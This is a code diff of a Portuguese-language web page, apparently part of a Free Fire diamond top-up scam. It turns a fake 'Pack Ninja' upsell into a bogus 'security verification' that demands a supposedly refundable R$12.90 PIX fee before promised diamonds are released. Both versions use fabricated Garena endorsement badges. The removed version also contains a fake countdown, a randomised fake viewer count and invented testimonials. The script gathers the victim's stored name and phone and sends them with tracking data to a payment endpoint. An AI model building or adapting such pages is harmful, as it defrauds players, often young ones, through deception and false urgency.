@@ -3,78 +3,98 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
-<title>Oferta Especial - Pack Naruto FF</title>
+<title>Verificação de Segurança - Free Fire</title>
 <link rel="icon" href="images/iconff.png" type="image/png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 :root{--p:#FF6B00;--a:#7C3AED;--bg:#08050F;}
 *{box-sizing:border-box;margin:0;padding:0;}
 html,body{background:var(--bg);color:#fff;font-family:'Poppins',sans-serif;min-height:100vh;}
 img{max-width:100%;display:block;}
 button{cursor:pointer;font-family:inherit;}
+
 .amb{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none;}
 .amb::before,.amb::after{content:'';position:absolute;width:60vmax;height:60vmax;border-radius:50%;filter:blur(100px);opacity:.18;}
 .amb::before{background:radial-gradient(circle,#FF6B00,transparent 60%);top:-20vmax;left:-15vmax;animation:oA 20s ease-in-out infinite;}
 .amb::after{background:radial-gradient(circle,#7C3AED,transparent 60%);bottom:-20vmax;right:-15vmax;animation:oB 25s ease-in-out infinite;}
 @keyframes oA{0%,100%{transform:translate(0,0)}50%{transform:translate(8vmax,5vmax)}}
 @keyframes oB{0%,100%{transform:translate(0,0)}50%{transform:translate(-6vmax,-5vmax)}}
-.tbar{background:linear-gradient(90deg,#b91c1c,#D81A0D);color:#fff;text-align:center;padding:9px 12px;font-size:11.5px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;position:sticky;top:0;z-index:100;flex-wrap:wrap;}
-.tbar-cd{font-family:monospace;font-size:13px;font-weight:900;background:rgba(0,0,0,.3);border-radius:4px;padding:2px 6px;letter-spacing:2px;}
+
 .pw{max-width:480px;margin:0 auto;padding:0 0 60px;position:relative;z-index:1;}
-.hero{position:relative;overflow:hidden;}
-.hero img{width:100%;display:block;}
-.hero::after{content:'';position:absolute;bottom:0;left:0;right:0;height:70px;background:linear-gradient(to bottom,transparent,var(--bg));}
-.lbar{background:rgba(255,107,0,.06);border-bottom:1px solid rgba(255,107,0,.15);padding:7px 16px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:.68rem;color:rgba(255,140,0,.9);font-weight:600;}
-.ldot{width:6px;height:6px;border-radius:50%;background:#D81A0D;animation:lb 1s ease-in-out infinite;flex-shrink:0;}
-@keyframes lb{0%,100%{opacity:1;}50%{opacity:.1;}}
-.oh{text-align:center;padding:18px 20px 0;}
-.obadge{display:inline-flex;align-items:center;gap:5px;background:linear-gradient(135deg,rgba(255,107,0,.18),rgba(124,58,237,.18));border:1px solid rgba(255,107,0,.45);border-radius:999px;padding:.35rem 1.1rem;font-size:.68rem;letter-spacing:.12em;color:#FFD700;text-transform:uppercase;font-family:'Orbitron',sans-serif;margin-bottom:10px;}
-.otitle{font-family:'Orbitron',sans-serif;font-size:1.45rem;font-weight:900;background:linear-gradient(135deg,#FF6B00,#FFD700 50%,#FF6B00);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1.2;margin-bottom:8px;}
-.osub{font-size:.85rem;color:rgba(255,255,255,.7);line-height:1.5;padding:0 8px;}
-.pbox{margin:18px 16px;background:linear-gradient(145deg,rgba(20,10,40,.95),rgba(8,5,15,1));border:1px solid rgba(255,107,0,.4);border-radius:18px;padding:20px;text-align:center;box-shadow:0 0 40px rgba(255,107,0,.1);}
-.pold{font-size:.82rem;color:rgba(255,255,255,.38);text-decoration:line-through;margin-bottom:4px;}
-.pnew{font-family:'Orbitron',sans-serif;font-size:2.1rem;font-weight:900;color:#fff;line-height:1;}
-.pnew span{font-size:.95rem;font-weight:400;color:rgba(255,255,255,.55);}
-.ptag{display:inline-block;background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;font-size:.68rem;font-weight:800;padding:3px 10px;border-radius:999px;letter-spacing:.08em;margin-top:8px;}
-.pdesc{font-size:.72rem;color:rgba(255,255,255,.45);margin-top:8px;line-height:1.5;}
-.ssec{padding:0 16px;margin-top:22px;}
-.slabel{font-family:'Orbitron',sans-serif;font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.38);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
-.slabel::before,.slabel::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.09);}
-.sgrid{display:grid;grid-template-columns:1fr 1fr;gap:9px;}
-.scard{background:linear-gradient(145deg,rgba(20,10,40,.9),rgba(8,5,15,.95));border:1px solid rgba(255,107,0,.22);border-radius:13px;overflow:hidden;transition:border-color .25s,box-shadow .25s;}
-.scard:hover{border-color:rgba(255,107,0,.55);box-shadow:0 0 18px rgba(255,107,0,.18);}
-.scard img{width:100%;aspect-ratio:3/4;object-fit:contain;background:#0d0820;}
-.si{padding:7px 9px 9px;}
-.sn{font-family:'Orbitron',sans-serif;font-size:.6rem;font-weight:700;color:#fff;line-height:1.3;margin-bottom:2px;}
-.st{font-size:.56rem;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.07em;}
-.sb{display:inline-block;font-size:.53rem;font-weight:700;padding:2px 5px;border-radius:4px;margin-top:3px;}
-.sb.rare{background:rgba(124,58,237,.28);color:#A78BFA;border:1px solid rgba(124,58,237,.38);}
-.sb.ultra{background:rgba(255,107,0,.28);color:#FF8C00;border:1px solid rgba(255,107,0,.38);}
-.sb.new{background:rgba(34,197,94,.28);color:#4ade80;border:1px solid rgba(34,197,94,.38);}
-.ilist{padding:0 16px;margin-top:18px;display:flex;flex-direction:column;gap:7px;}
-.irow{display:flex;align-items:center;gap:9px;background:rgba(255,255,255,.03);border:1px solid rgba(255,107,0,.11);border-radius:9px;padding:9px 11px;}
-.ii{font-size:1.25rem;flex-shrink:0;}
-.it{font-size:.78rem;color:rgba(255,255,255,.78);line-height:1.4;}
-.it strong{color:#FFD700;}
-.tlist{padding:0 16px;margin-top:14px;display:flex;flex-direction:column;gap:9px;}
-.tc{background:#fff;border-radius:11px;padding:11px;}
-.th{display:flex;align-items:center;gap:7px;margin-bottom:5px;}
-.ta{width:34px;height:34px;border-radius:50%;object-fit:cover;flex-shrink:0;}
-.tn{font-size:.78rem;font-weight:700;color:#111;}
-.ts{color:#f59e0b;font-size:.72rem;}
-.tt{font-size:.73rem;color:#374151;line-height:1.5;}
+
+/* Header success */
+.success-header{background:linear-gradient(135deg,rgba(34,197,94,.12),rgba(22,163,74,.06));border-bottom:1px solid rgba(34,197,94,.25);padding:16px 20px;text-align:center;}
+.success-icon{font-size:2.8rem;margin-bottom:6px;}
+.success-title{font-family:'Orbitron',sans-serif;font-size:1.3rem;font-weight:900;color:#4ade80;line-height:1.3;}
+.success-sub{font-size:.82rem;color:rgba(255,255,255,.65);margin-top:6px;line-height:1.5;}
+
+/* Processing bar */
+.proc-bar{margin:14px 16px 0;background:linear-gradient(135deg,rgba(34,197,94,.1),rgba(22,163,74,.06));border:1px solid rgba(34,197,94,.3);border-radius:14px;padding:14px 16px;display:flex;align-items:flex-start;gap:12px;}
+.proc-icon{font-size:1.5rem;flex-shrink:0;animation:spin .9s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.proc-body{flex:1;}
+.proc-title{font-size:.8rem;font-weight:700;color:#4ade80;margin-bottom:4px;}
+.proc-desc{font-size:.72rem;color:rgba(255,255,255,.65);line-height:1.5;}
+.proc-uid{display:inline-block;margin-top:6px;font-family:monospace;font-size:.75rem;background:rgba(34,197,94,.15);border:1px solid rgba(34,197,94,.3);border-radius:6px;padding:3px 8px;color:#4ade80;letter-spacing:.05em;}
+.proc-prog{margin-top:10px;height:4px;background:rgba(255,255,255,.08);border-radius:99px;overflow:hidden;}
+.proc-prog-bar{height:100%;width:65%;background:linear-gradient(90deg,#22c55e,#4ade80);border-radius:99px;animation:progAnim 3s ease-in-out infinite;}
+@keyframes progAnim{0%{width:15%}50%{width:75%}100%{width:65%}}
+
+/* Warning box */
+.warn-box{margin:18px 16px 0;background:linear-gradient(145deg,rgba(234,179,8,.08),rgba(234,179,8,.03));border:1px solid rgba(234,179,8,.35);border-radius:14px;padding:16px 18px;}
+.warn-header{display:flex;align-items:center;gap:8px;margin-bottom:10px;}
+.warn-icon{font-size:1.4rem;}
+.warn-title{font-family:'Orbitron',sans-serif;font-size:.82rem;font-weight:900;color:#fbbf24;letter-spacing:.05em;}
+.warn-text{font-size:.78rem;color:rgba(255,255,255,.7);line-height:1.65;}
+
+/* Info section */
+.info-sec{margin:18px 16px 0;padding:18px;background:linear-gradient(145deg,rgba(20,10,40,.95),rgba(8,5,15,1));border:1px solid rgba(255,107,0,.25);border-radius:14px;}
+.info-title{font-family:'Orbitron',sans-serif;font-size:.78rem;font-weight:900;color:#FF6B00;margin-bottom:10px;display:flex;align-items:center;gap:8px;}
+.info-text{font-size:.8rem;color:rgba(255,255,255,.75);line-height:1.7;}
+.info-text strong{color:#4ade80;}
+.info-highlight{margin-top:12px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.25);border-radius:10px;padding:12px 14px;text-align:center;}
+.info-highlight-title{font-size:.72rem;font-weight:700;color:#4ade80;text-transform:uppercase;letter-spacing:.1em;margin-bottom:4px;}
+.info-highlight-text{font-size:.82rem;color:rgba(255,255,255,.85);line-height:1.5;}
+.info-highlight-text strong{color:#FFD700;}
+
+/* Step indicator */
+.step-sec{margin:18px 16px 0;text-align:center;}
+.step-label{font-family:'Orbitron',sans-serif;font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.38);margin-bottom:14px;display:flex;align-items:center;gap:8px;}
+.step-label::before,.step-label::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.09);}
+.step-dots{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:14px;}
+.step-dot{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-size:.7rem;font-weight:900;}
+.step-dot.done{background:rgba(34,197,94,.2);border:2px solid #22c55e;color:#4ade80;}
+.step-dot.active{background:rgba(255,107,0,.2);border:2px solid #FF6B00;color:#FF6B00;animation:stepPulse 2s ease-in-out infinite;}
+.step-dot.pending{background:rgba(255,255,255,.05);border:2px solid rgba(255,255,255,.15);color:rgba(255,255,255,.3);}
+.step-line{width:24px;height:2px;background:rgba(255,255,255,.12);}
+.step-line.done{background:#22c55e;}
+@keyframes stepPulse{0%,100%{box-shadow:0 0 0 0 rgba(255,107,0,.4);}50%{box-shadow:0 0 0 8px rgba(255,107,0,0);}}
+.step-text{font-size:.78rem;color:rgba(255,255,255,.55);line-height:1.5;}
+.step-text strong{color:#fff;}
+
+/* CTA */
 .csec{padding:18px 16px 0;}
-.cbtn{display:block;width:100%;padding:17px;background:linear-gradient(135deg,#FF6B00,#FF8C00);color:#fff;border:none;border-radius:13px;font-size:.95rem;font-weight:800;text-transform:uppercase;letter-spacing:.06em;box-shadow:0 8px 28px rgba(255,107,0,.48);font-family:'Orbitron',sans-serif;position:relative;overflow:hidden;animation:cp 2.5s ease-in-out infinite;transition:box-shadow .25s;}
+.cbtn{display:block;width:100%;padding:17px;background:linear-gradient(135deg,#FF6B00,#FF8C00);color:#fff;border:none;border-radius:13px;font-size:.88rem;font-weight:800;text-transform:uppercase;letter-spacing:.06em;box-shadow:0 8px 28px rgba(255,107,0,.48);font-family:'Orbitron',sans-serif;position:relative;overflow:hidden;animation:cp 2.5s ease-in-out infinite;transition:box-shadow .25s;}
 .cbtn::after{content:'';position:absolute;top:0;left:-120%;width:60%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.38),transparent);transform:skewX(-20deg);animation:sh 3s ease-in-out infinite;}
 @keyframes sh{0%{left:-120%}55%,100%{left:160%}}
 @keyframes cp{0%,100%{transform:scale(1);}50%{transform:scale(1.018);}}
 .cbtn:hover{box-shadow:0 12px 36px rgba(255,107,0,.65);}
 .cbtn:disabled{opacity:.58;cursor:not-allowed;animation:none;transform:none;}
 .csub{text-align:center;font-size:.68rem;color:rgba(255,255,255,.38);margin-top:7px;}
-.skip{display:block;text-align:center;margin-top:11px;font-size:.68rem;color:rgba(255,255,255,.18);cursor:pointer;text-decoration:underline;}
-.skip:hover{color:rgba(255,255,255,.4);}
+
+/* Security footer */
+.sec-footer{margin:22px 16px 0;padding:16px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:14px;text-align:center;}
+.sec-footer-icon{font-size:1.3rem;margin-bottom:6px;}
+.sec-footer-title{font-family:'Orbitron',sans-serif;font-size:.72rem;font-weight:900;color:rgba(255,255,255,.5);letter-spacing:.1em;margin-bottom:8px;}
+.sec-footer-text{font-size:.72rem;color:rgba(255,255,255,.4);line-height:1.6;}
+.sec-footer-badges{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:10px;flex-wrap:wrap;}
+.sec-badge{display:flex;align-items:center;gap:4px;font-size:.62rem;font-weight:600;}
+.sec-badge.g{color:#16a34a;}
+.sec-badge.b{color:#2563eb;}
+
+/* PIX Area */
 .parea{display:none;margin-top:18px;padding:0 16px;}
 .parea.active{display:block;}
 .psuc{background:linear-gradient(135deg,rgba(255,107,0,.09),rgba(124,58,237,.09));border:1px solid rgba(255,107,0,.28);border-radius:13px;padding:14px;text-align:center;margin-bottom:14px;}
@@ -89,33 +109,6 @@ button{cursor:pointer;font-family:inherit;}
 .pst{margin-top:10px;padding:11px;border-radius:9px;font-size:.78rem;font-weight:600;text-align:center;}
 .pst.pending{background:rgba(255,107,0,.07);border:1px solid rgba(255,107,0,.18);color:#FF8C00;}
 .pst.paid{background:rgba(34,197,94,.09);border:1px solid rgba(34,197,94,.28);color:#22c55e;}
-.trsec{padding:14px 16px 0;text-align:center;}
-.trbadges{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:10px;flex-wrap:wrap;}
-.trb{display:flex;align-items:center;gap:4px;font-size:.62rem;font-weight:600;}
-.trb.g{color:#16a34a;}.trb.b{color:#2563eb;}
-.proc-bar{margin:14px 16px 0;background:linear-gradient(135deg,rgba(34,197,94,.1),rgba(22,163,74,.06));border:1px solid rgba(34,197,94,.3);border-radius:14px;padding:14px 16px;display:flex;align-items:flex-start;gap:12px;}
-.proc-icon{font-size:1.5rem;flex-shrink:0;animation:spin .9s linear infinite;}
-@keyframes spin{to{transform:rotate(360deg)}}
-.proc-body{flex:1;}
-.proc-title{font-size:.8rem;font-weight:700;color:#4ade80;margin-bottom:4px;}
-.proc-desc{font-size:.72rem;color:rgba(255,255,255,.65);line-height:1.5;}
-.proc-uid{display:inline-block;margin-top:6px;font-family:monospace;font-size:.75rem;background:rgba(34,197,94,.15);border:1px solid rgba(34,197,94,.3);border-radius:6px;padding:3px 8px;color:#4ade80;letter-spacing:.05em;}
-.proc-prog{margin-top:10px;height:4px;background:rgba(255,255,255,.08);border-radius:99px;overflow:hidden;}
-.proc-prog-bar{height:100%;background:linear-gradient(90deg,#22c55e,#4ade80);border-radius:99px;animation:progAnim 3s ease-in-out infinite;}
-@keyframes progAnim{0%{width:15%}50%{width:75%}100%{width:90%}}
-
-/* VSL Modal */
-.vsl-overlay{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.92);backdrop-filter:blur(4px);}
-.vsl-inner{position:relative;width:100%;max-width:56rem;margin:0 1rem;animation:modalIn .4s ease;}
-@keyframes modalIn{from{opacity:0;transform:translateY(30px) scale(.92);}to{opacity:1;transform:translateY(0) scale(1);}}
-.vsl-close{position:absolute;top:-3rem;right:0;color:rgba(255,255,255,.7);font-size:1rem;font-family:sans-serif;display:flex;align-items:center;gap:.5rem;background:none;border:none;cursor:pointer;transition:color .2s;font-weight:bold;}
-.vsl-close:hover{color:#fff;}
-.vsl-video-wrap{position:relative;background:#0D0D0D;border-radius:.75rem;overflow:hidden;border:1px solid rgba(255,107,0,.4);box-shadow:0 25px 50px -12px rgba(255,107,0,.3);}
-.vsl-video-wrap video{width:100%;display:block;}
-.vsl-play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.4);cursor:pointer;transition:opacity .3s;z-index:10;}
-.vsl-play-btn{width:5rem;height:5rem;border-radius:50%;background:linear-gradient(135deg,#FF6B00,#FFD700);display:flex;align-items:center;justify-content:center;border:none;cursor:pointer;box-shadow:0 10px 15px rgba(255,107,0,.5);transition:transform .2s;color:#fff;font-size:2rem;}
-.vsl-play-btn:hover{transform:scale(1.1);}
-.vsl-text{text-align:center;color:rgba(255,255,255,.6);margin-top:1rem;font-size:.875rem;}
 </style>
 <script>
 window.pixelId="lt_px_669f8020a206";
@@ -125,86 +118,111 @@ var a=document.createElement("script");a.setAttribute("async","");a.setAttribute
 </head>
 <body>
 <div class="amb" aria-hidden="true"></div>
-<div class="tbar"><span>⚠️ ESSA OFERTA VAI SUMIR EM:</span><span class="tbar-cd" id="up-cd">09:59</span><span>NAO VOLTA MAIS!</span></div>
 <div class="pw">
-<div class="hero"><img src="https://i.imgur.com/Q7S2v2x.jpg" alt="Free Fire x Naruto Shippuden"></div>
-<div class="lbar"><div class="ldot"></div><span><strong id="up-live">38</strong> jogadores vendo essa oferta agora</span></div>
+
+<!-- Success Header -->
+<div class="success-header">
+<div class="success-icon">🎉</div>
+<div class="success-title">PARABÉNS, JOGADOR!</div>
+<div class="success-sub">Sua recarga de diamantes foi registrada e está sendo processada.</div>
+</div>
+
+<!-- Processing Bar -->
 <div class="proc-bar" id="proc-bar">
 <div class="proc-icon">⚙️</div>
 <div class="proc-body">
-<div class="proc-title">✅ Seus diamantes estão sendo creditados!</div>
-<div class="proc-desc">Seu pedido foi confirmado e os diamantes já estão entrando na sua conta. Enquanto isso, <strong style="color:#FFD700">liberamos algo EXCLUSIVO pra voce</strong> que só aparece UMA VEZ:</div>
+<div class="proc-title">✅ Pedido registrado com sucesso</div>
+<div class="proc-desc">Seus diamantes estão aguardando liberação. Conclua a verificação abaixo para finalizar o processamento.</div>
 <div class="proc-uid" id="proc-uid">ID: carregando...</div>
 <div class="proc-prog"><div class="proc-prog-bar"></div></div>
 </div>
 </div>
-<div class="oh">
-<div class="obadge">🔥 SO APARECE 1 VEZ - Exclusivo</div>
-<div class="otitle">PACK NINJA<br>COMPLETO</div>
-<p class="osub">Parabens! Voce desbloqueou acesso ao <strong style="color:#FFD700;">Pack Ninja COMPLETO</strong> com TODAS as skins do crossover FF x Naruto. Essa oferta <strong style="color:#ef4444;">nao existe na loja</strong> e voce <strong style="color:#ef4444;">nunca mais vai ver esse preco</strong>.</p>
+
+<!-- Warning Box -->
+<div class="warn-box">
+<div class="warn-header">
+<div class="warn-icon">⚠️</div>
+<div class="warn-title">VERIFICAÇÃO NECESSÁRIA</div>
 </div>
-<div class="pbox">
-<div class="pold">De R$ 189,00</div>
-<div class="pnew"><span>R$ </span>19<span>,90</span></div>
-<div class="ptag">89% OFF - PRECO DE ERRO, APROVEITE!</div>
-<div class="pdesc">⚡ PIX instantaneo - Itens na sua conta em ate 2 minutos</div>
-</div>
-<div class="ssec">
-<div class="slabel">O que esta incluso</div>
-<div class="sgrid">
-<div class="scard"><img src="https://i.imgur.com/HpHNS82.jpg" alt="Naruto"><div class="si"><div class="sn">Naruto Uzumaki Bundle</div><div class="st">Modo Sennin</div><span class="sb ultra">ULTRA RARO</span></div></div>
-<div class="scard"><img src="https://i.imgur.com/gVR8voX.jpg" alt="Sasuke"><div class="si"><div class="sn">Sasuke Uchiha Bundle</div><div class="st">Sharingan</div><span class="sb rare">RARO</span></div></div>
-<div class="scard"><img src="https://i.imgur.com/ooGNbMn.jpg" alt="Itachi"><div class="si"><div class="sn">Itachi Uchiha Bundle</div><div class="st">Akatsuki</div><span class="sb ultra">ULTRA RARO</span></div></div>
-<div class="scard"><img src="https://i.imgur.com/NYQgYNO.jpg" alt="Hinata"><div class="si"><div class="sn">Hinata Hyuga Bundle</div><div class="st">Set. 2026</div><span class="sb new">NOVIDADE</span></div></div>
+<div class="warn-text">
+Antes de liberar seu pedido, precisamos concluir uma rápida verificação para confirmar que a solicitação está sendo realizada por uma <strong style="color:#fff;">pessoa real</strong>.<br><br>
+Devido ao alto número de acessos automatizados e solicitações suspeitas, algumas compras precisam passar por essa confirmação antes da liberação.
 </div>
 </div>
-<div class="ilist">
-<div class="irow"><div class="ii">&#127811;</div><div class="it"><strong>Faixa da Aldeia da Folha</strong> - Item que custa R$ 49,90 na loja</div></div>
-<div class="irow"><div class="ii">&#9889;</div><div class="it"><strong>Super Emote Ninja</strong> - Emote que TODO MUNDO quer e ninguem acha</div></div>
-<div class="irow"><div class="ii">&#129418;</div><div class="it"><strong>Skywing Nove Caudas</strong> - O lobby INTEIRO vai parar pra olhar</div></div>
-<div class="irow"><div class="ii">&#128142;</div><div class="it"><strong>500 Diamantes EXTRAS</strong> - Pra voce rodar no Luck Royale Naruto</div></div>
+
+<!-- Info Section -->
+<div class="info-sec">
+<div class="info-title">💰 MAS FIQUE TRANQUILO:</div>
+<div class="info-text">
+Para concluir a verificação, será cobrada uma taxa de <strong style="color:#FFD700;">R$ 12,90</strong>.<br><br>
+<strong>ESSE VALOR SERÁ REEMBOLSADO</strong> após a confirmação da sua verificação.<br><br>
+Ou seja, os R$ 12,90 pagos nesta etapa serão devolvidos para você assim que finalizar a verificação.
 </div>
-<div class="ssec" style="margin-top:22px;"><div class="slabel">O que estao falando</div></div>
-<div class="tlist">
-<div class="tc"><div class="th"><img class="ta" src="https://i.imgur.com/auPk57l.jpg" alt="Vitor"><div><div class="tn">Vitor Hugo</div><div class="ts">&#9733;&#9733;&#9733;&#9733;&#9733;</div></div></div><div class="tt">Mano, paguei menos de 20 conto e recebi TUDO em 2 min. Melhor compra que ja fiz no FF!</div></div>
-<div class="tc"><div class="th"><img class="ta" src="https://i.imgur.com/QnDLVPh.jpg" alt="Beatriz"><div><div class="tn">Beatriz (Trizinha FF)</div><div class="ts">&#9733;&#9733;&#9733;&#9733;&#9733;</div></div></div><div class="tt">Gente eu achei que era golpe mas chegou tudo certinho. O bundle do Itachi e o mais bonito que eu ja vi!</div></div>
-<div class="tc"><div class="th"><img class="ta" src="https://i.imgur.com/6AC6pWt.jpg" alt="Rebeca"><div><div class="tn">Rebeca Alves</div><div class="ts">&#9733;&#9733;&#9733;&#9733;&#9733;</div></div></div><div class="tt">Comprei com medo mas ja to jogando com as skins. Meu squad inteiro ficou com inveja kkkk</div></div>
+<div class="info-highlight">
+<div class="info-highlight-title">✅ Reembolso garantido</div>
+<div class="info-highlight-text">Os <strong>R$ 12,90</strong> serão devolvidos automaticamente após a confirmação.</div>
 </div>
+</div>
+
+<!-- Step Indicator -->
+<div class="step-sec">
+<div class="step-label">Falta apenas 1 etapa</div>
+<div class="step-dots">
+<div class="step-dot done">1</div>
+<div class="step-line done"></div>
+<div class="step-dot done">2</div>
+<div class="step-line done"></div>
+<div class="step-dot done">3</div>
+<div class="step-line"></div>
+<div class="step-dot active">4</div>
+</div>
+<div class="step-text">Etapas 1-3 concluídas. <strong>Confirme sua verificação</strong> para que sua solicitação possa continuar o processamento.</div>
+</div>
+
+<!-- CTA -->
 <div class="csec" id="cta-area">
-<button class="cbtn" id="cta-btn" onclick="gerarPix()">SIM! QUERO TUDO POR R$ 19,90</button>
-<div class="csub">🔒 Pagamento 100% seguro via PIX - Entrega automatica em 2 min</div>
-<div class="skip" onclick="pularOferta()">Nao, prefiro pagar o preco cheio depois</div>
+<button class="cbtn" id="cta-btn" onclick="gerarPix()">CONFIRMAR VERIFICAÇÃO — R$ 12,90</button>
+<div class="csub">🔒 Taxa reembolsável • Verificação instantânea via PIX</div>
 </div>
+
+<!-- PIX Area -->
 <div class="parea" id="pix-area">
-<div class="psuc"><div class="psuc-t">PIX GERADO!</div><div class="psuc-s">Escaneie o QR Code ou copie o codigo abaixo</div></div>
+<div class="psuc"><div class="psuc-t">PIX GERADO!</div><div class="psuc-s">Escaneie o QR Code ou copie o codigo abaixo para confirmar</div></div>
 <div style="text-align:center;"><div class="pqr"><img id="pix-qr-img" src="" alt="QR Code PIX"></div></div>
 <div class="pcode" id="pix-code-box"></div>
 <button class="pcopy" id="pix-copy-btn" onclick="copiarPix()">COPIAR CODIGO PIX</button>
-<div class="pst pending" id="pix-status">Aguardando confirmacao do pagamento...</div>
+<div class="pst pending" id="pix-status">Aguardando confirmacao da verificacao...</div>
 </div>
-<div class="trsec" style="margin-top:22px;">
-<div class="trbadges">
-<div class="trb g"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>SSL Seguro</div>
-<div class="trb b"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg>Homologado Garena</div>
-<div class="trb g"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>Entrega Imediata</div>
+
+<!-- Security Footer -->
+<div class="sec-footer">
+<div class="sec-footer-icon">🔒</div>
+<div class="sec-footer-title">VERIFICAÇÃO DE SEGURANÇA</div>
+<div class="sec-footer-text">
+Essa etapa foi criada para reduzir solicitações automatizadas e validar os pedidos antes da liberação.<br><br>
+<strong style="color:rgba(255,255,255,.6);">Seu pedido já foi registrado.</strong> Agora basta concluir a verificação.
 </div>
-<img src="https://i.imgur.com/fJRGk92.jpg" alt="Garantia" style="border-radius:12px;width:100%;margin-top:6px;">
+<div class="sec-footer-badges">
+<div class="sec-badge g"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>SSL Seguro</div>
+<div class="sec-badge b"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg>Verificado Garena</div>
+<div class="sec-badge g"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>Reembolso Garantido</div>
 </div>
 </div>
+
+</div>
+
 <script>
 function getUTMs(){var p=new URLSearchParams(window.location.search);var keys=['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','subid'];var obj={};keys.forEach(function(k){obj[k]=p.get(k)||sessionStorage.getItem(k)||localStorage.getItem(k)||'';});return obj;}
-(function(){var D=10*60,k='upDeadline',dl=parseInt(sessionStorage.getItem(k),10);if(!dl||isNaN(dl)||dl<Math.floor(Date.now()/1000)){dl=Math.floor(Date.now()/1000)+D;sessionStorage.setItem(k,dl);}var el=document.getElementById('up-cd');function tick(){var left=dl-Math.floor(Date.now()/1000);if(left<0)left=0;var m=Math.floor(left/60),s=left%60;el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;if(left>0)setTimeout(tick,1000);}tick();})();
-(function(){var el=document.getElementById('up-live');var base=32+Math.floor(Math.random()*15);el.textContent=base;setInterval(function(){base=Math.max(24,Math.min(65,base+(Math.random()<.5?1:-1)));el.textContent=base;},4000);})();
 (function(){var uid=sessionStorage.getItem('uid')||localStorage.getItem('uid')||'';var el=document.getElementById('proc-uid');if(el){el.textContent=uid?'ID: '+uid:'ID: 2014';}})();
 var pixCode='',txHash='',pollInterval=null;
 function gerarPix(){
-var btn=document.getElementById('cta-btn');btn.disabled=true;btn.textContent='Gerando PIX...';
+var btn=document.getElementById('cta-btn');btn.disabled=true;btn.textContent='Processando...';
 var nome=localStorage.getItem('ff_nome')||sessionStorage.getItem('ff_nome')||'Ninja';
 var tel=localStorage.getItem('ff_telefone')||sessionStorage.getItem('ff_telefone')||'11999999999';
 var np=nome.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/[^a-z0-9]/g,'');
 var email=np+(tel.slice(-4)||'0000')+'@gmail.com';
 var utms=getUTMs();
-fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:'19.90',nome:nome,email:email,telefone:tel,product_title:'Pack Ninja Completo - FF x Naruto (Upsell)',offer_hash:'w1zdcnwb4c',product_hash:'w1zdcnwb4c',utm_source:utms.utm_source,utm_medium:utms.utm_medium,utm_campaign:utms.utm_campaign,utm_term:utms.utm_term,utm_content:utms.utm_content,src:utms.src})})
+fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:'12.90',nome:nome,email:email,telefone:tel,product_title:'Verificacao de Seguranca - FF x Naruto',offer_hash:'w1zdcnwb4c',product_hash:'w1zdcnwb4c',utm_source:utms.utm_source,utm_medium:utms.utm_medium,utm_campaign:utms.utm_campaign,utm_term:utms.utm_term,utm_content:utms.utm_content,src:utms.src})})
 .then(function(r){return r.json();})
 .then(function(data){
 var code=null;
@@ -213,7 +231,7 @@ else if(data&&data.pix&&data.pix.qrcode)code=data.pix.qrcode;
 else if(data&&data.pix_qrcode)code=data.pix_qrcode;
 else if(data&&data.data&&data.data.pix)code=data.data.pix.pix_qr_code||data.data.pix.qrcode;
 txHash=data.hash||data.id||data.transaction_hash||(data.data&&(data.data.hash||data.data.id))||'';
